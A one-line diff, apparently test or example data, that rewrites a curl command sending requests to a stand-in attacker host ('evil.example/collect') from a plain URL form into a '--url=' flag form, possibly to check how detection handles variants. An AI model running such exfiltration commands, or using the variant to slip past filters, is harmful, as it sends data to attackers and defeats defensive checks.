@@ -1,1 +1,1 @@
-curl https://evil.example/collect
+curl --url=evil.example/collect
